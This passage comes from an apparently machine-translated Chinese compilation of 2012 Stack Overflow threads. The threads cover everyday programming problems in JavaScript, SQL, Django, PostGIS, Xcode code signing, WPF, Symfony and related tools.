var myObject = myObject ? myObject : function(){}; 
```

以下代码

```
var AppSpace = AppSpace || {}; 
```

之所以使用，是因为要设置和使用命名空间的多个文件，如果命名空间已经创建，您不想覆盖它。这样，首先包含哪个文件都没有关系。

这是另一个违约的例子。

```
function doSomething (callback)  {
   something();
   code();      
   callback = callback || function() {};
   // Now we can call the callback even if it wasn't passed in.
   callback();         
} 
```

但是，请注意以下问题。[为什么 IE 使用 nuke window.ABC 变量？](https://stackoverflow.com/questions/4606847/why-does-ie-nuke-window-abc-variables/4607721#4607721)

也就是说，如果一个命名空间已经使用

```
window.AppSpace = {a: 1}; 
```

和另一个文件集

```
var AppSpace = AppSpace || {} 
```

在IE中，如果两个脚本在不同的脚本标签中，它会将window.AppSpace的值覆盖为空对象，因为变量提升以及IE没有意识到这一点`window.a`并且`var a`在顶层都指向相同的事实多变的。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-14T18:17:27.467

function(){} 是一个空类，因为类是 JavaScript 中的函数。这段代码特别利用了 JavaScript 中 OR 的提前退出 - 它评估第一项，如果它是真的，则将结果设置为等于该值，如果它是假的，则设置为等于第二项。因此，如果 myObject 为真（非空），则 myObject 等于该值，如果不是，则它等于一个空函数。

基本上，这段代码的意思是“如果 myObject 已经是某物，则将其保留在原处，否则使其等于此空白函数”。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-14T20:18:19.917

这种技术称为“短路”评估。

*hort-circuit 评估、最小评估或 McCarthy 评估表示某些编程语言中的一些布尔运算符的语义，其中第二个参数仅在第一个参数不足以确定表达式的值时执行或评估：当第一个参数AND 函数的参数计算结果为假，整体值必须为假；并且当 OR 函数的第一个参数计算结果为 true 时，整体值必须为 true*

[http://en.wikipedia.org/wiki/Short-circuit_evaluation](http://en.wikipedia.org/wiki/Short-circuit_evaluation)

# android - 具有 sharedUserId 的应用程序在安装时会杀死具有相同 uid 的其他应用程序

> ID：12429826
> 
> 赞同：3
> 
> 时间：2012-09-14T18:14:18.037
> 
> 标签：android, process, installation, kill, userid

我有两个应用程序，我们称它们为 APP-A 和 APP-B，它们共享用户 ID `"com.example.app.USER"`，如果 APP-A 正在运行并且我安装了 APP-B，则 APP-A 关闭。有谁知道这种行为是否是有意的？如果是，您可以链接到文档中的任何参考吗？如果没有，我可以做些什么作为解决方法？

* * *

**编辑：**

请注意：当通过 安装 APP-B 时会发生这种情况`adb install`，如果从设备的文件浏览器安装，则进程会被终止然后重新启动。（这非常令人沮丧，因为这会通过`try...catch`块绕过异常处理）

# pdf - 需要删除 PDF 上的一堆空白？

> ID：12429830
> 
> 赞同：1
> 
> 时间：2012-09-14T18:14:36.923
> 
> 标签：pdf, formatting, pdf-generation, acrobat

我有大约 100 个格式奇怪的 PDF 文件（每个 1-3 页长），我需要修复它们。问题是几乎所有的顶部都有大量的空白。我有 Acrobat X Pro。

例如：http: [//imageshack.us/a/img195/510/ex1w.png](http://imageshack.us/a/img195/510/ex1w.png)
下载示例：[http ://www.sendspace.com/file/2hohj5](http://www.sendspace.com/file/2hohj5)

我尝试使用“移动或更改对象工具”选择文本并将其向上移动，但是覆盖文本的方式有一个白框。如果我删除该框，则它下面会有更多我无法拥有的文本。

我很困惑。如果这个问题没有意义，请下载 pdf 并自己尝试。

另一个示例（这次跨多个页面）：http: [//imageshack.us/a/img337/3714/ex2v.png](http://imageshack.us/a/img337/3714/ex2v.png) 下载示例：[http ://www.sendspace.com/file/q7dmnl](http://www.sendspace.com/file/q7dmnl)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-14T20:48:19.220

您可以使用 Ghostscript 从页面中截取内容并降低页面高度。试试这个：

```
gs                  \
  -o out.pdf        \
  -sDEVICE=pdfwrite \
  -g6120x5000       \
   2hohj5.pdf 
```

第一页裁剪的结果（PNG，按比例缩小）：

![出.png](../Images/0dba7f74072661c4cd5f4b4ffef44e03.png)

或者，您可以使用 Ghostscript 将每个页面的内容向上移动 3 英寸（== 216 点）而不更改页面大小：

```
gs                                                  \
  -o out2.pdf                                       \
  -sDEVICE=pdfwrite                                 \
  -c "<</Install {0 216 translate}>> setpagedevice" \
  -f 2hohj5.pdf 
```

第 1 页的结果，内容向上移动了 3 英寸（按比例缩放的 PNG）：

![out2.png](../Images/e44c8f9b5c5647b6c2b0d19bf8498bf4.png)

# jquery - 使用 jQuery 插件 xdomainajax.js 进行跨域 Ajax 调用：只有一个网站工作

> ID：12429833
> 
> 赞同：1
> 
> 时间：2012-09-14T18:14:42.983
> 
> 标签：jquery, ajax, cross-domain

我正在尝试使用此插件进行跨域 ajax 调用：[cross-domain-ajax](https://github.com/padolsey/jQuery-Plugins/tree/master/cross-domain-ajax/)

我立即在 BBC 网站上对其进行了测试，它可以正常工作，这是简单的代码：

```
$.ajax({
    url: 'http://www.bbc.co.uk/news/',
    type: 'GET',
    success: function(res) {
        alert(res);
        $('#container').text(res);
    } 
```

但是，由于某种原因，我尝试的每个其他 URL 都不起作用，它什么也没做。有人能帮我一下吗？BBC 不是我想要使用的实际网站，这是我想要使用的示例 URL：

[http://sdo.gsfc.nasa.gov/assets/img/browse/](http://sdo.gsfc.nasa.gov/assets/img/browse/)

但我尝试了各种方法（谷歌、推特等），除了 BBC 网站外，什么都没有。有谁知道这可能是为什么？BBC 网站是否有什么特别之处可以允许这种呼叫，而其他人则不允许？

谢谢，

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-14T18:22:03.077

在这里工作...... [http://jsfiddle.net/VnvtD/1/](http://jsfiddle.net/VnvtD/1/)

# sql - SQL Query，如何从表中获取数据，但只有当它被插入另一个表时

> ID：12429838
> 
> 赞同：3
> 
> 时间：2012-09-14T18:15:03.060
> 
> 标签：sql, join, foreign-keys

好吧，我不知道如何在标题上解释这个，所以我会在这里更清楚。

我有几张桌子：

TiposDeCatalogo:

```
PK IdTipoCatalogo (int) 
IdVendedor (int)
Nombre (string)
Descripcion (string)
Estado (string)
FechaAlta (date)

Catalogo: 

PK IdCatalogo (int) 
IdTipoCatalogo (int)
IdVendedor (int)
Nombre (string)
Descripcion (string)
Estado (string)
FechaAlta (date) 
```

Catalogo.IdTipoCatalogo = TiposDeCatalogos.IdTipoCatalogo 上有一个外键

我需要一个查询，该查询可以显示 TiposDeCatalogo 上已在 Catalogo 上注册的所有行

例如...

TiposDeCatalogos 有以下几行

```
IdTipoCatalogo IdVendedor Nombre Estado FechaAlta

1   1   Catalogos de Ventas     Activo  20/08/2012
2   1   Catalogos de CRM        Activo  20/08/2012
3   1   Catalogos de Inventario     Activo  20/08/2012
4   1   Catalogos de Facturacion        Activo  04/09/2012
5   1   Catalogos de Cobranza       Activo  04/09/2012
6   1   Catalogos de Admin      Activo  04/09/2012
7   1   Catalogos de Admin      Activo  04/09/2012
8   1   Catalogos de Finanzas       Activo  04/09/2012
9   1   Catalogos de Clientes       Activo  04/09/2012
12  1   Catalogos de Administ General       Activo  04/09/2012 
```

然后 Catalogo 有以下几行

```
IdCatalogo IdTipoCatalogo IdVendedor Nombre Estado FechaAlta

1   1   17  Formas de Pago  formas de pago para las ventas  Activo  01/09/2012
2   5   1   Tipos de Moneda     Activo  05/09/2012
3   2   1    Tipos de Agendamiento      Activo  05/09/2012
4   3   1   Tipos de Precios        Activo  06/09/2012
5   5   1    TIpos de Moneda        Activo  06/09/2012
6   3   1   Tipo de Presentacion        Activo  06/09/2012 
```

您可能会注意到，在 Catalogo 中，仅注册了以下 IdTipoCatalogo (1, 2, 3, 5)

所以我想要的是一个向我显示那些 TiposDeCatalogos 的查询（每个只有一次，所以在这个例子中查询应该只返回 4 行）......

我希望你能帮助我，谢谢

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-14T18:17:57.443

您可以使用[`EXISTS`](http://www.techonthenet.com/sql/exists.php)来完成此操作：

```
SELECT
    tc.IdTipoCatalogo,
    tc.IdVendedor,
    tc.Nombre,
    tc.Estado,
    tc.FechaAlta
FROM TiposDeCatalogos tc
WHERE EXISTS (
    SELECT 1
    FROM Catalogo c 
    WHERE c.IdTipoCatalogo = tc.IdTipoCatalogo 
) 
```

或者，您可以使用`JOIN`and `DISTINCT`：

```
SELECT DISTINCT
    tc.IdTipoCatalogo,
    tc.IdVendedor,
    tc.Nombre,
    tc.Estado,
    tc.FechaAlta
FROM 
    TiposDeCatalogos tc
    JOIN Catalogo c ON c.IdTipoCatalogo = tc.IdTipoCatalogo 
```

但是，这可能会降低效率，因为这`DISTINCT`将需要额外的操作来排除`JOIN`.

# java - Maven 2 站点生成，哪个网站上有关于它的信息

> ID：12429844
> 
> 赞同：0
> 
> 时间：2012-09-14T18:15:23.420
> 
> 标签：java, spring, maven, maven-3, maven-plugin

有人可以告诉我最好的站点来阅读并找出我可以用 Maven 2 站点生成做的所有事情。

我看到 maven 可以为该项目建立一个站点，但我想了解我可以选择的所有选项.. 有人可以告诉我哪个站点最适合去学习它

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-14T18:16:31.843

学习使用站点插件的最好方法是阅读使用站点插件的开源项目的源代码——例如，所有的 maven 插件。

# asp.net - 图像在 Windows 7 上移到左侧

> ID：12429846
> 
> 赞同：-1
> 
> 时间：2012-09-14T18:15:32.150
> 
> 标签：asp.net, html, css

最近，我公司迁移到Windows 7操作系统。

我在我的 Windows XP 机器上使用 Visual Studio 2010 中的以下主文件，一切正常，现在我将以下代码迁移到 Windows 7 和相同的 Visual Studio 2010，下面的所有图像都移到了左边。我可以调整它们，但我很好奇为什么所有图像都向左移动，我使用的是相同的监视器，Visual Studio 2010 版本是相同的。

```
 <%@ Master Language="C#" AutoEventWireup="true" CodeFile="Login.master.cs" Inherits="Masters_Login" %>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "

<html xmlns="http://www.w3.org/1999/xhtml">
<head runat="server">
    <title></title>
    <link href="../App_Themes/NG/style.css" rel="Stylesheet" type="text/css" />
   <style type="text/css">   
          div ,
           div img { display:block } 
            .fl  
              {
                  float:left; 
                  margin-left:15%;
                  background-color:#8e2826;
                  width:68.1%;
                  margin-right:18%;
                  text-align:center;
              }

              .f2
              {
                  float:left; 
                  margin-left:15%;
                  background-color:#e5e0dd;
                  width:68.1%;
                  margin-right:18%;
                  text-align:center;

              }
              .f3
              {
                    float:left; 
                  margin-left:15%;
                  background-color:#d4cfcd;
                  width:68.1%;
                  margin-right:18%;
                  text-align:center;

              }

                .style1
        {
            color: #8e2826;
        }

      </style> 
    <asp:ContentPlaceHolder id="head" runat="server">
    </asp:ContentPlaceHolder>
</head>
<body >
    <form id="form1" runat="server" >

           <div style="margin-left:15%; background-color:#343434; width: 68.1%; margin-right:18%; ">  

                     <asp:Image ID="imgIS" ImageUrl="~/images/improved_LOGO.jpg" runat="server" />

        </div>

         <div class="fl" >

         <asp:Image ID="imgTop" runat="server" ImageUrl="~/images/m_banner_top.jpg" />

         </div>

  <div class="f2">
   <asp:Image ID="Image2" runat="server" ImageUrl="~/images/m_banner_btm_5.jpg" />

  </div>

  <div class="f3" ></div>

    <div class="f3">
        <asp:ContentPlaceHolder id="ContentPlaceHolder1" runat="server">

        </asp:ContentPlaceHolder>
    </div>

            <div style="margin-left:15%; margin-right:18%; width: 68.1%; background-color:#8e2826; text-align:center">

             <asp:Image ID="banner" runat="server" ImageUrl="~/images/b_banner_calibri.jpg"/>

       </div>

    </form>
</body>
</html> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-15T06:12:07.697

如果要将它们与页面中心对齐，请在 CSS 中添加以下行：

```
width://fixed width;
margin-left: auto;
margin-right:auto; 
```

# php - Symfony2 PHPUnit，测试稍长，Monolog相关的致命错误

> ID：12429847
> 
> 赞同：2
> 
> 时间：2012-09-14T18:15:37.213
> 
> 标签：php, symfony, phpunit, monolog

我已将我的问题缩小到一个涉及非常干净的 dbal 查询的单元测试。该查询涉及一个嵌套集，当我从 3 到 4 级分层类别时发生故障。执行时间方面的变化非常小。我正在使用的功能在 10 级时没有问题。但是，在 PhpUnit 中，当我运行 4 个或更多级别的测试时——我遇到了一个致命错误。

***总而言之，一个可能比平时多花一秒时间的查询或一个标签位更多的资源让我`php fatal error`进入`PHPUnit`***

错误如下所示：

> > 致命错误：在第 92 行的 /var/www/my-app/vendor/symfony/symfony/src/Symfony/Component/HttpKernel/Debug/Stopwatch.php 中调用未定义的方法 Monolog\Formatter\LineFormatter::stopEvent()

[这里](https://stackoverflow.com/questions/7950344/phpunit-selenium-basic-test-fails-with-fatal-error)有人在第 92 行也遇到了 phpUnit 致命错误问题。会不会有关系？？

我已经列出了一些古怪的方法（如下）来绕过我的问题，但我仍然想知道为什么这样一个基本测试似乎会导致这个问题。

*   运行 PhpUnit 并将其`processIsolation`设置为“true”。
*   不要`static::createClient();`在 setUpBeforeClass() 方法中访问

我有一个受人尊敬的#symfony (Stof) 成员建议我似乎不正确地将@logger 投入服务.. 但我已经确认这似乎不是通过使用记录器服务我的任何服务。

也许这个问题与超时有关？（错误提到`stopevent`和`stopwatch`）。或者这个错误可能与访问`$client = static::createClient();`有关`setUpBeforeClass()`..然后在前面的测试中再次访问..无论如何..这让我感到困惑，据我所知，我的 Symfony2 (2.1.1) 安装中的其他所有东西都在工作完全没问题。

*** Stopwatch.php 的第 92 行 .. [github 源文件在这里](https://github.com/symfony/symfony/blob/master/src/Symfony/Component/HttpKernel/Debug/Stopwatch.php)***

```
 /**
 * Stops an event.
 * @param string $name The event name
 * @return StopwatchEvent A StopwatchEvent instance
 */
public function stop($name)
{ return end($this->activeSections)->stopEvent($name);} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-14T19:45:05.037

好的。因此，您从数组中获取最后一项，`$this->activeSections`然后他们尝试在`stopEvent()`其上运行该方法。在这种情况下，`LineFormatter`该类似乎没有可用的方法。

我对 Monolog 不熟悉，但简要浏览一下他们最新的 GitHUb 存储库，我可以看到它继承的 LineFormatter 或 NormalizerFormatter 类都没有这样的方法。

看来 Monolog 与 Symfony 的关系并不好。如果不修改 Monolog 和/或 Symfony Stopwatch 类，您将无法使用 Stopwatch 来分析与 Monolog 相关的代码。

# javascript - 在 localhost Dev Box 上测试 JSONP 请求的最佳方法

> ID：12429858
> 
> 赞同：0
> 
> 时间：2012-09-14T18:16:26.497
> 
> 标签：javascript, jsonp

我没有可以轻松部署的测试服务器，我想测试一些 jsonp 请求。如果我只是在开发盒上从 eclipse 部署，那么最好的方法是什么？如果我在 Eclipse 中在不同的端口上部署 2 个服务器实例，它是否被视为跨站点请求？有什么方法可以伪造它并在项目中进行本地测试吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-14T18:17:19.673

至于两个域不匹配，您应该可以将其作为跨站点 jsonp 调用进行测试。

术语“来源”是使用运行脚本的 HTML 文档的域名、应用层协议和（在大多数浏览器中）端口号来定义的。当且仅当所有这些值完全相同时，才认为两个资源具有相同的来源。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-14T18:18:54.603

JSONP 不需要 2 个主机，它只支持它。因此，无论您的 JSONP 响应是来自远程服务器还是来自同一台服务器，它的工作原理几乎相同。

# xcode - 持续集成代码签名问题

> ID：12429864
> 
> 赞同：4
> 
> 时间：2012-09-14T18:16:36.507
> 
> 标签：xcode, continuous-integration, xcrun

我一直在为我的 iOS 构建设置 TeamCity 持续集成构建代理，但遇到了一些障碍。

我们将为具有不同证书和移动配置文件的不同客户端进行构建，所以我想我会编写一个构建脚本来创建一个未签名的存档，然后使用适当的身份和移动配置对其进行签名。似乎 xcrun 命令不喜欢 .app 文件未签名，因此不会对其进行签名。

我做错了什么，还是有其他更优雅的方式来完成我想做的事情？

*信息转储如下...*

* * *

我正在使用以下命令创建未签名的构建：

```
xcodebuild -workspace "[workspace].xcworkspace" -scheme "[scheme]" clean archive CODE_SIGN_ENTITY="" CODE_SIGNING_REQUIRED=NO 
```

然后，我尝试使用以下命令进行代码签名并创建 IPA：

```
APP=[path to .app file in archive]
OUT_IPA=[desired location of .ipa]
IDENTITY=[CodeSigning Identity]
MOBILE_PROVISION=[path to .mobileprovision]
xcrun -sdk iphoneos PackageApplication -v "${APP}" -o "${OUT_IPA}" --sign "${IDENTITY}" --embed "${MOBILE_PROVISION}" 
```

xcrun 命令打印一堆调试信息，然后将文件复制到临时目录。然后它检查原始应用程序

```
### Checking original app

+ /usr/bin/codesign --verify -vvvv /Users/jibanez/Library/Developer/Xcode/Archives/2012-09-14/[scheme] 9-14-12 12.02 PM.xcarchive/Products/Applications/[product].app
Program /usr/bin/codesign returned 1 : [/Users/jibanez/Library/Developer/Xcode/Archives/2012-09-14/[scheme] 9-14-12 12.02 PM.xcarchive/Products/Applications/[product].app: code object is not signed at all
In architecture: armv7
]
Codesign check fails : /Users/jibanez/Library/Developer/Xcode/Archives/2012-09-14/[scheme] 9-14-12 12.02 PM.xcarchive/Products/Applications/[product].app: code object is not signed at all
In architecture: armv7

Done checking the original app 
```

这似乎是对的。毕竟，我没有对存档进行代码签名，这就是 xcrun 应该做的。这就是事情变得奇怪的地方：

```
### Embedding '/Users/jibanez/Documents/[projectdir]/codesign/[scheme]/842F2922-D0CB-46CE-81E5-B7362DD1D960.mobileprovision'
+ /bin/rm -rf /var/folders/hh/qhf8930s5hg8lwbp2j_zsdm822y1s1/T/NycIiYdEYe/Payload/[product].app/embedded.mobileprovision
Program /bin/rm returned 0 : []
+ /bin/cp -rp /Users/jibanez/Documents/[projectdir]/codesign/[scheme]/mobileProvision.mobileprovision /var/folders/hh/qhf8930s5hg8lwbp2j_zsdm822y1s1/T/NycIiYdEYe/Payload/[product].app/embedded.mobileprovision
Program /bin/cp returned 0 : []
+ /usr/bin/codesign -d --entitlements /var/folders/hh/qhf8930s5hg8lwbp2j_zsdm822y1s1/T/NycIiYdEYe/entitlements_rawwAdCadPV /var/folders/hh/qhf8930s5hg8lwbp2j_zsdm822y1s1/T/NycIiYdEYe/Payload/[product].app
Program /usr/bin/codesign returned 1 : [/var/folders/hh/qhf8930s5hg8lwbp2j_zsdm822y1s1/T/NycIiYdEYe/Payload/[product].app: code object is not signed at all
]
error: Failed to read entitlements from '/var/folders/hh/qhf8930s5hg8lwbp2j_zsdm822y1s1/T/NycIiYdEYe/Payload/[product].app'
Failed: PackageApplication 
```

# python - Django 过滤与所有给定值匹配的 m2m 字段

> ID：12429869
> 
> 赞同：5
> 
> 时间：2012-09-14T18:16:51.227
> 
> 标签：python, django

鉴于我有詹姆斯和尤金的作者。使用内置的`__in`QuerySet 将过滤匹配 James 或 Eugene 的 m2m 字段。但是，如果我只想要这两个匹配项怎么办。

示例设置：鉴于

```
authors = Author.objects.filter(interests__in=['python','ruby'])
# [<Author: James>, <Author: Eugene>] 
```

这是我为正常情况所做的查询。它将返回任何包含 James 或 Eugene 或两者的书籍：

```
books = Book.objects.filter(authors__in=authors)
# [<Book: Book by James, Jack>, <Book: Book by Eugene>] 
```

但目前，如果我想找到一本由 James 和 Eugene 共同撰写的书，我将不得不循环。

```
books = Book.objects
for author in authors:
    books = books.filter(authors=author)
# books [<Book: Book by James, Eugene>] 
```

是否有一种优雅的方法可以直接对匹配两个给定值的 m2m 字段进行过滤。也许像

```
books = Book.objects.filter(authors__match=authors) 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-14T18:27:31.183

您可以使用 Q 对象：

```
AND = lambda q, value: q & Q(authors_in=value)
Books.objects.filter(reduce(AND, authors, Q())) 
```

如果您有作者列表而不仅仅是他们的 id，您还可以将 book_set 组合在一起：

```
books = reduce(lambda q,a: q & a.book_set.all(), authors, Book.objects.none()) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-14T18:42:50.807

您可以使用 & 运算符

```
# The list of authors you want to match
authors_pks = authors.values_list('pk', flat=True)

books = Book.objects

for pk in authors_pks:
    books &= Book.objects.filter(authors=pk)

print books.all() 
```

# c# - Npgsql 参数化查询输出与 PostGIS 不兼容

> ID：12429874
> 
> 赞同：4
> 
> 时间：2012-09-14T18:17:23.640
> 
> 标签：c#, postgresql, postgis, npgsql, sql-parametrized-query

我在 Npgsql 命令中有这个参数化查询：

```
UPDATE raw.geocoding
SET the_geom = ST_Transform(ST_GeomFromText('POINT(:longitude :latitude)', 4326),3081)
WHERE id=:id 
```

`:longutide`并且`:latitude`是**double**，并且`id`是**int**。

实际针对 DB 运行的查询如下所示：

```
UPDATE raw.geocoding
SET the_geom = ST_Transform(ST_GeomFromText('POINT(((E'-96.6864379495382')::float8) ((E'32.792527154088')::float8))', 4326),3081)
WHERE id=((10793455)::int4) 
```

感谢 Erwin Brandstetter [here](https://stackoverflow.com/questions/12398904/postgis-query-failing-due-to-escape-string/12400182)的帮助，很明显需要简化查询以使用 PostGIS。他建议这样做：

```
UPDATE raw.geocoding
SET    the_geom = ST_Transform(ST_GeomFromText(
                  $$POINT(:longitude :latitude)$$::geometry, 4326), 3081)
WHERE  id = :id 
```

我想我可以使用动态查询来创建它，每次运行时我都会手动更新查询，但是有没有办法使用 Npgsql 参数化查询来实现它？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-14T18:45:24.377

我不是专家`npgsql`，但我认为您的参数化查询可以像这样工作：

```
UPDATE raw.geocoding
SET    the_geom = ST_Transform(ST_GeomFromText(:mygeom, 4326), 3081)
WHERE  id = :id 
```

并`mygeom`会持有这个字符串：

```
POINT(96.6864379495382 32.792527154088) 
```

..从您的其他变量中预先组装。会产生这样的查询：

```
UPDATE raw.geocoding
SET    the_geom = ST_Transform(ST_GeomFromText(
             (E'POINT(96.6864379495382 32.792527154088)')::text, 4326),3081)
WHERE  id=((10793455)::int4) 
```

哪个应该工作。

* * *

如果您在组装字符串时遇到问题（如您的评论所示），有一种更优雅的方法。根据[@Paul 在我之前的回答中的提示](https://stackoverflow.com/questions/12398904/postgis-query-failing-due-to-escape-string/12400182#comment16715688_12400182)- PostGIS 为此目的提供了一个专用功能：

```
ST_MakePoint(double precision x, double precision y) 
```

[手册中的详细信息](http://postgis.net/docs/manual-2.1/ST_MakePoint.html)。有了这个，我们最终得出：

```
UPDATE raw.geocoding
SET    the_geom = ST_Transform(ST_SetSRID(
               ST_MakePoint(:longitude, :latitude), 4326), 3081)
WHERE  id = :id 
```

注意逗号。它现在终于可以工作了吗？
^(如果没有，那就用大锤敲打它。GRML。)

它确实 - 使用[`ST_SetSRID()`](http://postgis.net/docs/manual-2.1/ST_SetSRID.html)now 而不是`ST_GeomFromText()`. 见评论。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-01-04T12:17:55.000

就我而言，我使用了：

```
NpgsqlCommand command = new NpgsqlCommand(
                "select ST_Distance( ST_SetSRID(" +
                    "ST_MakePoint(@longitude, @latitude), 4326)," +
                    "(select geom from segments where segment_id= @id )," +
                    "true)",
                    m_DBConnection); 
```

它奏效了。另外，尝试：

```
 NpgsqlCommand command = new NpgsqlCommand(
                "select ST_AsText( ST_ClosestPoint( ST_GeomFromText('POINT(" +
                    longitude.ToString(CultureInfo.GetCultureInfo("en-US").NumberFormat) + " " +
                    latitude.ToString(CultureInfo.GetCultureInfo("en-US").NumberFormat) + ")', 4326)," +
                        "(select geom from segments where segment_id= @id )))",
                        m_DBConnection); 
```

谢谢。

# authentication - DotNetOpenAuth 重定向 URL 结果到页面未找到

> ID：12429877
> 
> 赞同：0
> 
> 时间：2012-09-14T18:17:36.897
> 
> 标签：authentication, mobile, browser, dotnetopenauth

我已经使用 DotNetOpenAuth 库部署了一项服务。

该服务针对 4 个提供商（Google、Yahoo、Windows 和 Facebook）进行身份验证

我在使用 Windows 和 Facebook（Oauth 协议）时遇到问题

通过任何浏览器访问时，我的服务都可以正常工作。选择后，它会重定向到正确的提供商，进行身份验证并使用电子邮件地址回复。

但是通过移动设备访问时，该服务不起作用。使用移动设备，当我选择 Windows/Facebook 时，它会将我重定向到登录页面。提供我的凭据后，服务返回，但 url 的重定向导致找不到页面。

重定向的 url 看起来像： http://mydomain.com/facebook.aspx?code= [a_very_long_string](http://mydomain.com/facebook.aspx?code=a_very_long_string)

我收到一条消息，在 Android 手机的浏览器上找不到该页面。通过台式机/笔记本电脑 (Windows 7) 的浏览器访问时，相同的代码可以正常工作。

如果我遗漏了任何东西以使该服务适用于手机，请告诉我

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-14T18:49:04.480

我能够解决这个问题。事实证明，在进行自定义重定向之前，我不能使用 server.Urlencode() .Net 函数。

如果我使用它，该应用程序会在移动平台中中断。删除它，修复了问题，并且成功重定向了 url。

身份验证成功并编码 url 后，我正在执行自定义重定向。但似乎它破坏了应用程序。

不确定这是 DotNetOpenAuth 库的限制还是移动浏览器的限制。

# c# - 具有相同 View 的 ListView

> ID：12429878
> 
> 赞同：2
> 
> 时间：2012-09-14T18:17:42.953
> 
> 标签：c#, wpf, listview

我有一些`ListView`，我希望它们都具有相同的`View`. 所以，如果以下是我的`View`：

```
<ListView.View>
    <GridView>
      <GridViewColumn Width="140" Header="Game Name" 
         DisplayMemberBinding="{Binding GameName}"  />
      <GridViewColumn Width="140" Header="Creator"  
         DisplayMemberBinding="{Binding Creator}" />
      <GridViewColumn Width="140" Header="Publisher" 
         DisplayMemberBinding="{Binding Publisher}" />
    </GridView>
</ListView.View> 
```

我想要这样的东西：

```
<Grid>

 <ListView>
   <!--Here my ListView is the same defined above-->
 </ListView>

 <ListView>
   <!--Here my ListView is the same defined above-->
 </ListView>

</Grid> 
```

我怎样才能做到这一点？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-14T18:25:37.253

在资源中定义视图（在顶级控件的资源字典中，或者在外部资源字典中）：

```
<StackPanel>
    <StackPanel.Resources>
        <GridView x:Key="myView" x:Shared="false">
            <GridViewColumn Width="140" Header="Game Name" 
     DisplayMemberBinding="{Binding GameName}"  />
            <GridViewColumn Width="140" Header="Creator"  
     DisplayMemberBinding="{Binding Creator}" />
            <GridViewColumn Width="140" Header="Publisher" 
     DisplayMemberBinding="{Binding Publisher}" />
        </GridView>
    </StackPanel.Resources>

    <ListView View="{StaticResource myView}"/>
    <ListView View="{StaticResource myView}"/>
</StackPanel> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-14T18:21:44.810

用这个。干杯

```
<Grid>

    <ListView Name="FirstList">
        <ListView.View>
            <GridView>
                <GridViewColumn Width="140" Header="Game Name" DisplayMemberBinding="{Binding GameName}"  />
                <GridViewColumn Width="140" Header="Creator" DisplayMemberBinding="{Binding Creator}" />
                <GridViewColumn Width="140" Header="Publisher" DisplayMemberBinding="{Binding Publisher}" />
            </GridView>
        </ListView.View>
    </ListView>

    <ListView View="{Binding Path=View, ElementName=FirstList}" />

</Grid> 
```

# facebook - Facebook SWF 游戏提要发布不起作用

> ID：12429882
> 
> 赞同：1
> 
> 时间：2012-09-14T18:17:59.243
> 
> 标签：facebook, feed, facebook-opengraph, game-development

在过去的几天里，我一直在尝试让一个小型 swf 游戏通过我的墙上的 feed 帖子运行（根据 Facebook 开发人员网站上的说明）。到目前为止，尽管 OG 调试器中的所有内容都正确显示，但我还没有成功。我用来生成提要帖子的元数据如下：

```
<head prefix="og: http://ogp.me/ns fb: http://ogp.me/ns/fb"> 
<meta property="fb:app_id"       content="157726317622339" />
<meta property="og:type"         content="game" />
<meta property="og:url"          content="http://devapplatform.com:3557/site/feed_game/" />
<meta property="og:title"        content="It Or Miss Mini Game" />
<meta property="og:description"  content="Sebastian submitted to It or Miss, Come vote for them here!" />
<meta property="og:image"        content="http://devapplatform.com:3558/images/catSurprise.jpg" />
<meta property="og:video"        content="http://devapplatform.com:3558/images/catTest.swf" />
<meta property="og:video:width"  content="398" />
<meta property="og:video:height" content="299" />
<meta property="og:video:type"   content="application/x-shockwave-flash" />
</head> 
```

此代码存储在以下网页上： [http ://devapplatform.com:3557/site/feed_game/](http://devapplatform.com:3557/site/feed_game/)

如果您想测试此代码以查看其发布的确切内容，您只需启动我的测试应用程序（确保为您的帐户关闭 HTTPS - 由于我的环境的技术限制，我无法在此应用程序上启用 HTTPS。请放心，此应用程序的生产版本已启用 HTTPS）。在加载过程中，提要对话框应在启动后立即出现：http: [//apps.facebook.com/itgirlsb/](http://apps.facebook.com/itgirlsb/)

免责声明：这些链接不保证始终可用，因为它们托管在本地测试环境中，该环境在晚上 PSD 关闭。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-30T13:47:58.753

我看不到要测试的页面或图像/SWF，但试试这些：

1.  您的图片至少应为 90x90 像素，否则我们将不会显示图片，因此无需点击任何内容。理想情况下使它们为 200x200 像素或更大。

2.  如果您希望嵌入适用于使用安全浏览 (https://www.facebook.com) 的任何人，那么您需要在安全主机上托管您的 SWF。如果它在 http 主机上，我们只能为禁用安全浏览的用户嵌入它；否则浏览器会抛出混合内容警告。

# database - delphi 6 和 ADO ms 访问数据库

> ID：12429883
> 
> 赞同：0
> 
> 时间：2012-09-14T18:18:00.390
> 
> 标签：database, delphi, ms-access

我搜索了很多论坛和谷歌，但我仍然不确定如何找到答案。

我有**Delphi 6 标准版（个人版）**，但是，现在我进入了数据库领域，我想将我的一些项目合并到一个 MS Access 数据库中。

由于我同时拥有 Office 2000（家用电脑）和 Office 2003（工作电脑），我想我可以通过 activex 导入，但是当我尝试时 ADO 没有出现。但那失败了

那么，我该如何让 Delphi 6 变得对数据库友好，包括控件、组件安装等呢？

我想要做的是创建一个 MS Access 数据库 ( `.mdb`)，并使用 Delphi 6 应用程序通过我的表单控件打开它。

# maven-2 - 使用由自定义属性构建的版本安装和部署 Maven 工件

> ID：12429884
> 
> 赞同：1
> 
> 时间：2012-09-14T18:18:03.603
> 
> 标签：maven-2, maven-deploy-plugin, maven-install-plugin

